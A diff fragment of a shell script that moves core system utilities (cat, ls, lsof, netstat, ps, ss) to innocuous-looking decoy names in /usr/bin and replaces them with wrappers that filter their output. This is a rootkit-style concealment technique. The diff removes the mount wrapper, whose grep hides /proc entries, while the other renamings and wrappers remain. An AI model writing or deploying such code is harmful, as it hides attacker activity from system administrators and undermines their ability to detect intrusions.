@@ -2,7 +2,6 @@
 cat_path=`which cat`
 ls_path=`which ls`
 lsof_path=`which lsof`
-mount_path=`which mount`
 netstat_path=`which netstat`
 ps_path=`which ps`
 ss_path=`which ss`
@@ -12,7 +11,6 @@ vim_path=`which vim`
 mv "$cat_path" /usr/bin/systemd-stop
 mv "$ls_path" /usr/bin/pbmtoaw
 mv "$lsof_path" /usr/bin/pbmtoget
-mv "$mount_path" /usr/bin/zipfind
 mv "$netstat_path" /usr/bin/ziplist
 mv "$ps_path" /usr/bin/watchgnome
 mv "$ss_path" /usr/bin/traceroute-list
@@ -49,13 +47,6 @@ newlsof='
 '
 echo -e "$newlsof" >> $lsof_path
 chmod +x $lsof_path
-
-newmount='
-#!/bin/bash
-(/usr/bin/zipfind $@) | grep -Ev "/proc"
-'
-echo -e "$newmount" >> $mount_path
-chmod +x $mount_path
 
 newnetstat='
 #!/bin/bash
